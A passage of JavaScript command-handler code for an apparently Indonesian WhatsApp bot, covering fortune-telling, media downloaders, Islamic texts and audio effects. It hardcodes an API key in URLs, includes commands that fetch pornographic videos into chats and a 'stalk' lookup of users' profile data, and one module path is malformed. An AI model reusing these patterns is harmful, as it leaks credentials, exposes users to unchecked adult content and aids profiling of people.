                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                satria.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hari Naas :* ${anu.message.hari_naas}\n⭔ *Info :* ${anu.message.catatan}\n⭔ *Catatan :* ${anu.message.info}`, m)
            }
            break
            case 'nagahari': case 'harinaga': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                satria.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'arahrejeki': case 'arahrezeki': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                satria.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Rezeki :* ${anu.message.arah_rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'peruntungan': {
                if (!text) throw `Example : ${prefix + command} DIka, 7, 7, 2005, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`
                let [nama, tgl, bln, thn, untuk] = text.split`,`
                let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
                if (anu.status == false) return m.reply(anu.message)
                satria.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'weton': case 'wetonjawa': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.weton_jawa(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                satria.sendText(m.chat, `⭔ *Tanggal :* ${anu.message.tanggal}\n⭔ *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n⭔ *Watak Hari :* ${anu.message.watak_hari}\n⭔ *Naga Hari :* ${anu.message.naga_hari}\n⭔ *Jam Baik :* ${anu.message.jam_baik}\n⭔ *Watak Kelahiran :* ${anu.message.watak_kelahiran}`, m)
            }
            break
            case 'sifat': case 'karakter': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005`
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                satria.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Garis Hidup :* ${anu.message.garis_hidup}`, m)
            }
            break
            case 'keberuntungan': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005`
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                satria.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}`, m)
            }
            break
            case 'memancing': {
                if (!text) throw `Example : ${prefix + command} 12, 1, 2022`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                satria.sendText(m.chat, `⭔ *Tanggal :* ${anu.message.tgl_memancing}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'masasubur': {
                if (!text) throw `Example : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`
                let [tgl, bln, thn, siklus] = text.split`,`
                let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
                if (anu.status == false) return m.reply(anu.message)
                satria.sendText(m.chat, `⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'zodiak': case 'zodiac': {
                if (!text) throw `Example : ${prefix+ command} 7 7 2005`
                let zodiak = [
                    ["capricorn", new Date(1970, 0, 1)],
                    ["aquarius", new Date(1970, 0, 20)],
                    ["pisces", new Date(1970, 1, 19)],
                    ["aries", new Date(1970, 2, 21)],
                    ["taurus", new Date(1970, 3, 21)],
                    ["gemini", new Date(1970, 4, 21)],
                    ["cancer", new Date(1970, 5, 22)],
                    ["leo", new Date(1970, 6, 23)],
                    ["virgo", new Date(1970, 7, 23)],
                    ["libra", new Date(1970, 8, 23)],
                    ["scorpio", new Date(1970, 9, 23)],
                    ["sagittarius", new Date(1970, 10, 22)],
                    ["capricorn", new Date(1970, 11, 22)]
                ].reverse()

                function getZodiac(month, day) {
                    let d = new Date(1970, month - 1, day)
                    return zodiak.find(([_,_d]) => d >= _d)[0]
                }
                let date = new Date(text)
                if (date == 'Invalid Date') throw date
                let d = new Date()
                let [tahun, bulan, tanggal] = [d.getFullYear(), d.getWeek() + 1, d.getDate()]
                let birth = [date.getFullYear(), date.getWeek() + 1, date.getDate()]

                let zodiac = await getZodiac(birth[1], birth[2])
                
                let anu = await primbon.zodiak(zodiac)
                if (anu.status == false) return m.reply(anu.message)
                satria.sendText(m.chat, `⭔ *Zodiak :* ${anu.message.zodiak}\n⭔ *Nomor :* ${anu.message.nomor_keberuntungan}\n⭔ *Aroma :* ${anu.message.aroma_keberuntungan}\n⭔ *Planet :* ${anu.message.planet_yang_mengitari}\n⭔ *Bunga :* ${anu.message.bunga_keberuntungan}\n⭔ *Warna :* ${anu.message.warna_keberuntungan}\n⭔ *Batu :* ${anu.message.batu_keberuntungan}\n⭔ *Elemen :* ${anu.message.elemen_keberuntungan}\n⭔ *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'shio': {
                if (!text) throw `Example : ${prefix + command} tikus\n\nNote : For Detail https://primbon.com/shio.htm`
                let anu = await primbon.shio(text)
                if (anu.status == false) return m.reply(anu.message)
                satria.sendText(m.chat, `⭔ *Hasil :* ${anu.message}`, m)
            }
            break
	    case 'stalker': case 'stalk': {
		if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
		db.data.users[m.sender].limit -= 1 // -1 limit
                if (!text) return m.reply(`Example : ${prefix +command} type id\n\nList Type :\n1. ff (Free Fire)\n2. ml (Mobile Legends)\n3. aov (Arena Of Valor)\n4. cod (Call Of Duty)\n5. pb (point Blank)\n6. ig (Instagram)\n7. npm (https://npmjs.com)`)
                let [type, id, zone] = args
                if (type.toLowerCase() == 'ff') {
                    if (!id) throw `No Query id, Example ${prefix + command} ff 552992060`
                    let anu = await fetchJson(api('zenz', '/api/nickff', { apikey: global.APIKeys[global.APIs['zenz']], query: id }))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`ID : ${anu.result.gameId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'ml') {
                    if (!id) throw `No Query id, Example : ${prefix + command} ml 214885010 2253`
                    if (!zone) throw `No Query id, Example : ${prefix + command} ml 214885010 2253`
                    let anu = await fetchJson(api('zenz', '/api/nickml', { apikey: global.APIKeys[global.APIs['zenz']], query: id, query2: zone }))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`ID : ${anu.result.gameId}\nZone : ${anu.result.zoneId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'aov') {
                    if (!id) throw `No Query id, Example ${prefix + command} aov 293306941441181`
                    let anu = await fetchJson(api('zenz', '/api/nickaov', { apikey: global.APIKeys[global.APIs['zenz']], query: id }))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`ID : ${anu.result.gameId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'cod') {
                    if (!id) throw `No Query id, Example ${prefix + command} cod 6290150021186841472`
                    let anu = await fetchJson(api('zenz', '/api/nickcod', { apikey: global.APIKeys[global.APIs['zenz']], query: id }))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`ID : ${anu.result.gameId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'pb') {
                    if (!id) throw `No Query id, Example ${prefix + command} pb riio46`
                    let anu = await fetchJson(api('zenz', '/api/nickpb', { apikey: global.APIKeys[global.APIs['zenz']], query: id }))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`ID : ${anu.result.gameId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'ig') {
                    if (!id) throw `No Query username, Example : ${prefix + command} ig cak_haho`
                    let { result: anu } = await fetchJson(api('zenz', '/api/stalker/ig', { username: id }, 'apikey'))
                    if (anu.status == false) return m.reply(anu.result.message)
                    satria.sendMedia(m.chat, anu.caption.profile_hd, '', `⭔ Full Name : ${anu.caption.full_name}\n⭔ User Name : ${anu.caption.user_name}\n⭔ ID ${anu.caption.user_id}\n⭔ Followers : ${anu.caption.followers}\n⭔ Following : ${anu.caption.following}\n⭔ Bussines : ${anu.caption.bussines}\n⭔ Profesional : ${anu.caption.profesional}\n⭔ Verified : ${anu.caption.verified}\n⭔ Private : ${anu.caption.private}\n⭔ Bio : ${anu.caption.biography}\n⭔ Bio Url : ${anu.caption.bio_url}`, m)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'npm') {
                    if (!id) throw `No Query username, Example : ${prefix + command} npm scrape-primbon`
                    let { result: anu } = await fetchJson(api('zenz', '/api/stalker/npm', { query: id }, 'apikey'))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`⭔ Name : ${anu.name}\n⭔ Version : ${Object.keys(anu.versions)}\n⭔ Created : ${tanggal(anu.time.created)}\n⭔ Modified : ${tanggal(anu.time.modified)}\n⭔ Maintainers :\n ${anu.maintainers.map(v => `- ${v.name} : ${v.email}`).join('\n')}\n\n⭔ Description : ${anu.description}\n⭔ Homepage : ${anu.homepage}\n⭔ Keywords : ${anu.keywords}\n⭔ Author : ${anu.author.name}\n⭔ License : ${anu.license}\n⭔ Readme : ${anu.readme}`)
		    db.data.users[m.sender].limit -= 1
                } else {
                    m.reply(`Example : ${prefix +command} type id\n\nList Type :\n1. ff (Free Fire)\n2. ml (Mobile Legends)\n3. aov (Arena Of Valor)\n4. cod (Call Of Duty)\n5. pb (point Blank)\n6. ig (Instagram)\n7. npm (https://npmjs.com)`)
                }
            }
            break
	        case 'tiktok': case 'tiktoknowm': case 'tt': {
		if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
		db.data.users[m.sender].limit -= 1 // -1 limit
	if (!text) throw 'Masukkan Query Link!'
	m.reply(mess.wait)
	let anu = await fetchJson(api('zenz', '/downloader/musically', { url: text }, 'apikey'))
                satria.sendMessage(m.chat, { video: { url: anu.result.video, caption: 'Done'}}, { quoted: m})
            }
            break
            case 'xnxx': case 'xnxxdl': {
            	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
		db.data.users[m.sender].limit -= 1 // -1 limit
	if (!text) throw 'Masukkan Query Link!'
	reply(mess.wait)
	let anu = await fetchJson(api('zenz', '/downloader/xvideos', { url: text }, 'apikey'))
                satria.sendMessage(m.chat, { video: { url: anu.result.files.high, caption: 'Nih bang' } }, { quoted: floc })
                await sleep(99)
                satria.sendMessage(m.chat, { audio: { url : "https://a.uguu.se/YXAzeUvV.mp3"}, mimetype:'audio/mpeg', ptt:true }, {quoted:floc})
            }
            break
           case 'ppkul': case 'profilcool':{
           	reply(`Loading...`)
           	 let buttons = [
                    {buttonId: `.ppkul`, buttonText: {displayText: 'Next'}, type: 1}]
                let buttonMessage = {
                    image: { url: thumb },
                    caption: `Created By Satganz Devs`,
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 5
                }
                satria.sendMessage(m.chat, buttonMessage, { quoted: floc })
            }
            break
            case 'tiktokwm': case 'tiktokwatermark': {
            	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
		db.data.users[m.sender].limit -= 1 // -1 limit
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/downloader/tiktok', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `tiktoknowm ${text}`, buttonText: {displayText: '► No Watermark'}, type: 1},
                    {buttonId: `tiktokmp3 ${text}`, buttonText: {displayText: '♫ Audio'}, type: 1}
                ]
                let buttonMessage = {
                    video: { url: anu.result.watermark },
                    caption: `Download From ${text}`,
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 5
                }
                satria.sendMessage(m.chat, buttonMessage, { quoted: floc })
            }
            break
            case 'tiktokmp3': case 'tiktokaudio': {
            	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
		db.data.users[m.sender].limit -= 1 // -1 limit
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/downloader/musically', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `tiktoknowm ${text}`, buttonText: {displayText: '► No Watermark'}, type: 1},
                    {buttonId: `tiktokwm ${text}`, buttonText: {displayText: '► With Watermark'}, type: 1}
                ]
                let buttonMessage = {
                    text: `Download From ${text}`,
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 2
                }
                let msg = await satria.sendMessage(m.chat, buttonMessage, { quoted: floc })
                satria.sendMessage(m.chat, { audio: { url: anu.result.audio }, mimetype: 'audio/mpeg', contextInfo: { externalAdReply: { title: ` ${global.botname}`, body: ` Join Bot's Official GC`, previewType: "PHOTO", thumbnailUrl: `https://chat.whatsapp.com/HCqm6RHLxaSBBKbjktvVeC`, thumbnail: thumb, sourceUrl: "https://chat.whatsapp.com/HCqm6RHLxaSBBKbjktvVeC"}}}, { quoted: m})
            }
            break
	        case 'instagram': case 'ig': case 'igdl': {
		if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
		db.data.users[m.sender].limit -= 1 // -1 limit
                if (!text) throw 'No Query Url!'
                m.reply(mess.wait)
                if (/(?:\/p\/|\/reel\/|\/tv\/)([^\s&]+)/.test(isUrl(text)[0])) {
                    let anu = await fetchJson(api('zenz', '/downloader/instagram2', { url: isUrl(text)[0] }, 'apikey'))
                    for (let media of anu.data) satria.sendFileUrl(m.chat, media, `Download Url Instagram From ${isUrl(text)[0]}`, m)
                } else if (/\/stories\/([^\s&]+)/.test(isUrl(text)[0])) {
                    let anu = await fetchJson(api('zenz', '/downloader/instastory', { url: isUrl(text)[0] }, 'apikey'))
                    satria.sendFileUrl(m.chat, anu.media[0].url, `Download Url Instagram From ${isUrl(text)[0]}`, m)
                }
            }
            break
            case 'joox': case 'jooxdl': {
            	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
		db.data.users[m.sender].limit -= 1 // -1 limit
                if (!text) throw 'No Query Title'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/downloader/joox', { query: text }, 'apikey'))
                let msg = await satria.sendImage(m.chat, anu.result.img, `⭔ Title : ${anu.result.lagu}\n⭔ Album : ${anu.result.album}\n⭔ Singer : ${anu.result.penyanyi}\n⭔ Publish : ${anu.result.publish}\n⭔ Lirik :\n${anu.result.lirik.result}`, m)
                satria.sendMessage(m.chat, { audio: { url: anu.result.mp4aLink }, mimetype: 'audio/mpeg', fileName: anu.result.lagu+'.m4a' }, { quoted: msg })
            }
            break
            case 'soundcloud': case 'scdl': {
            	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
		db.data.users[m.sender].limit -= 1 // -1 limit
                if (!text) throw 'No Query Title'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/downloader/soundcloud', { url: isUrl(text)[0] }, 'apikey'))
                let msg = await satria.sendImage(m.chat, anu.result.thumb, `⭔ Title : ${anu.result.title}\n⭔ Url : ${isUrl(text)[0]}`)
                satria.sendMessage(m.chat, { audio: { url: anu.result.url }, mimetype: 'audio/mpeg', fileName: anu.result.title+'.m4a' }, { quoted: msg })
            }
            break
            case 'hentai':{
            	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
		db.data.users[m.sender].limit -= 1 // -1 limit
            let anu = await fetchJson('https://zenzapis.xyz/downloader/hentaivid?apikey=satganzdevs')
            m.reply(mess.wait)
                let buttons = [
                    {buttonId: `tiktoknowm ${text}`, buttonText: {displayText: 'Next Hentai'}, type: 1}
                ]
                let buttonMessage = {
                    video: { url: anu.result.video_2 },
                    caption: `Sagne Kok Sama Yang Gepeng`,
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 5
                }
                satria.sendMessage(m.chat, buttonMessage, { quoted: fdoc })
                await sleep(99)
                satria.sendMessage(m.chat, { audio: { url : "https://a.uguu.se/YXAzeUvV.mp3"}, mimetype:'audio/mpeg', ptt:true }, {quoted:floc})
                }
            break
            /*
            case 'stiksearch': case 'sts': case 'stikersearch': case 'stickersearch':{
             if (!text) throw `what sticker are you looking for?`
             let media = await fetchJson(`https://zenzapis.xyz/searching/stickerline?query=${q}&apikey=satganzdevs`)
             let medium = media.result.sticker[Math.floor(Math.random() * media.result.sticker.length)]
            	satria.sendImageAsSticker(m.chat, { image : { url : medium }}, m )
            }
            break
            */
            case 'meme':{
            	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
		db.data.users[m.sender].limit -= 1 // -1 limit
            let buttons = [
                    {buttonId: `meme`, buttonText: {displayText: 'Next Meme'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: 'https://zenzapis.xyz/randomimage/memeindo?apikey=satganzdevs' },
                    caption: `Random Meme`,
                    footer: global.footer,
                    buttons: buttons,
                    headerType: 4
                }
                satria.sendMessage(m.chat, buttonMessage, { quoted: fdoc })
            }
            break
            case 'darkjokes': case 'darkjoke':{
            	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
		db.data.users[m.sender].limit -= 1 // -1 limit
            let buttons = [
                    {buttonId: `darkjoke`, buttonText: {displayText: 'Next Dark Jokes'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: 'https://zenzapis.xyz/randomimage/darkjoke?apikey=satganzdevs' },
                    caption: `Random Dark Jokes`,
                    footer: global.footer,
                    buttons: buttons,
                    headerType: 4
                }
                satria.sendMessage(m.chat, buttonMessage, { quoted: fdoc })
            }
            break
            case 'cosplay': {
            	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
		db.data.users[m.sender].limit -= 1 // -1 limit
            let buttons = [
                    {buttonId: `cosplay`, buttonText: {displayText: 'Next '}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: 'https://zenzapis.xyz/randomimage/cosplay?apikey=satganzdevs' },
                    caption: `Istri gwekh`,
                    footer: global.footer,
                    buttons: buttons,
                    headerType: 4
                }
                satria.sendMessage(m.chat, buttonMessage, { quoted: fdoc })
                await sleep(99)
                satria.sendMessage(m.chat, { audio: { url : "https://a.uguu.se/YXAzeUvV.mp3"}, mimetype:'audio/mpeg', ptt:true }, {quoted:floc})
            }
            break
            case 'sound':{
            satria.sendMessage(m.chat, {audio: audiot, mimetype:'audio/mpeg', ptt:true }, {quoted:m})}
            break
	        case 'twitdl': case 'twitter': {
		if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
		db.data.users[m.sender].limit -= 1 // -1 limit
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/api/downloader/twitter', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `twittermp3 ${text}`, buttonText: {displayText: '► Audio'}, type: 1}
                ]
                let buttonMessage = {
                    video: { url: anu.result.HD || anu.result.SD },
                    caption: util.format(anu.result),
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 5
                }
                satria.sendMessage(m.chat, buttonMessage, { quoted: fdoc })
            }
            break
            case 'twittermp3': case 'twitteraudio': {
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/api/downloader/twitter', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `twitter ${text}`, buttonText: {displayText: '► Video'}, type: 1}
                ]
                let buttonMessage = {
		    image: { url: anu.result.thumb },
                    caption: util.format(anu.result),
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 4
                }
                let msg = await satria.sendMessage(m.chat, buttonMessage, { quoted: fdoc })
                satria.sendMessage(m.chat, { audio: { url: anu.result.audio } }, { quoted: msg })
            }
            break
	        case 'fbdl': case 'fb': case 'facebook': {
		if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
		db.data.users[m.sender].limit -= 1 // -1 limit
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/api/downloader/facebook', { url: text }, 'apikey'))
                satria.sendMessage(m.chat, { video: { url: anu.result.url }, caption: `⭔ Title : ${anu.result.title}`}, { quoted: fdoc })
            }
            break
	        case 'pindl': case 'pinterestdl': {
		if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
		db.data.users[m.sender].limit -= 1 // -1 limit
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let lety =`https://zenzapis.xyz/downloader/pinterestdl?apikey=satganzdevs&url=${q}`
                let anu = await fetchJson(lety)
                satria.sendMessage(m.chat, { video: { url: anu.result }, caption: `Download From ${text}` }, { quoted: fdoc })
            }
            break
            case 'umma': case 'ummadl': {
	        if (!text) throw `Example : ${prefix + command} https://umma.id/channel/video/post/gus-arafat-sumber-kecewa-84464612933698`
                let { umma } = require('./lib) scraper')
		let anu = await umma(isUrl(text)[0])
		if (anu.type == 'video') {
		    let buttons = [
                        {buttonId: `ytmp3 ${anu.media[0]} 128kbps`, buttonText: {displayText: '♫ Audio'}, type: 1},
                        {buttonId: `ytmp4 ${anu.media[0]} 360p`, buttonText: {displayText: '► Video'}, type: 1}
                    ]
		    let buttonMessage = {
		        image: { url: anu.author.profilePic },
			caption: `
⭔ Title : ${anu.title}
⭔ Author : ${anu.author.name}
⭔ Like : ${anu.like}
⭔ Caption : ${anu.caption}
⭔ Url : ${anu.media[0]}
Untuk Download Media Silahkan Klik salah satu Button dibawah ini atau masukkan command ytmp3/ytmp4 dengan url diatas
`,
			footer: global.footer,
			buttons,
			headerType: 4
		    }
		    satria.sendMessage(m.chat, buttonMessage, { quoted: fdoc })
		} else if (anu.type == 'image') {
		    anu.media.map(async (url) => {
		        satria.sendMessage(m.chat, { image: { url }, caption: `⭔ Title : ${anu.title}\n⭔ Author : ${anu.author.name}\n⭔ Like : ${anu.like}\n⭔ Caption : ${anu.caption}` }, { quoted: fdoc })
		    })
		}
	    }
	    break
        case 'ringtone': {
		if (!text) throw `Example : ${prefix + command} black rover`
        let { ringtone } = require('./lib/scraper')
		let anu = await ringtone(text)
		let result = anu[Math.floor(Math.random() * anu.length)]
		satria.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: fdoc })
	    }
	    break
		case 'iqra': {
		oh = `Example : ${prefix + command} 3\n\nIQRA Yang tersedia : 1,2,3,4,5,6`
		if (!text) throw oh
		yy = await getBuffer(`https://islamic-api-indonesia.herokuapp.com/api/data/pdf/iqra${text}`)
		satria.sendMessage(m.chat, {document: yy, mimetype: 'application/pdf', fileName: `iqra${text}.pdf`}, {quoted:m}).catch ((err) => m.reply(oh))
		}
		break
		case 'juzamma': {
		if (args[0] === 'pdf') {
		reply(mess.wait)
		satria.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pdf'}, mimetype: 'application/pdf', fileName: 'juz-amma-arab-latin-indonesia.pdf'}, {quoted:m})
		} else if (args[0] === 'docx') {
		reply(mess.wait)
		satria.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.docx'}, mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', fileName: 'juz-amma-arab-latin-indonesia.docx'}, {quoted:m})
		} else if (args[0] === 'pptx') {
		reply(mess.wait)
		satria.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pptx'}, mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation', fileName: 'juz-amma-arab-latin-indonesia.pptx'}, {quoted:m})
		} else if (args[0] === 'xlsx') {
		reply(mess.wait)
		satria.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.xlsx'}, mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', fileName: 'juz-amma-arab-latin-indonesia.xlsx'}, {quoted:m})
		} else {
		reply(`Mau format apa ? Example : ${prefix + command} pdf

Format yang tersedia : pdf, docx, pptx, xlsx`)
		}
		}
		break
		case 'hadis': case 'hadist': {
		if (!args[0]) throw `Contoh:
${prefix + command} bukhari 1
${prefix + command} abu-daud 1

Pilihan tersedia:
abu-daud
1 - 4590
ahmad
1 - 26363
bukhari
1 - 7008
darimi
1 - 3367
ibnu-majah
1 - 4331
nasai
1 - 5662
malik
1 - 1594
muslim
1 - 5362`
		if (!args[1]) throw `Hadis yang ke berapa?\n\ncontoh:\n${prefix + command} muslim 1`
		try {
		let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/json/hadith/${args[0]}`)
		let { number, arab, id } = res.find(v => v.number == args[1])
		reply(`No. ${number}

${arab}

${id}`)
		} catch (e) {
		reply(`Hadis tidak ditemukan !`)
		}
		}
		break
		case 'alquran': {
		if (!args[0]) throw `Examples of use :\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`
		if (!args[1]) throw `Examples of use :\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`
		let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
		let txt = `*Arab* : ${res.result.data.text.arab}
*English* : ${res.result.data.translation.en}
*Indonesia* : ${res.result.data.translation.id}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
		reply(txt)
		satria.sendMessage(m.chat, {audio: { url: res.result.data.audio.primary }, mimetype: 'audio/mpeg'}, { quoted : fdoc })
		}
		break
		case 'tafsirsurah': {
		if (!args[0]) throw `Examples of use :\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
		if (!args[1]) throw `Examples of use :\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
		let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
		let txt = `「 *Tafsir Surah*  」

*Pendek* : ${res.result.data.tafsir.id.short}

*Panjang* : ${res.result.data.tafsir.id.long}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
		reply(txt)
		}
		break
		   case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'tupai':
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
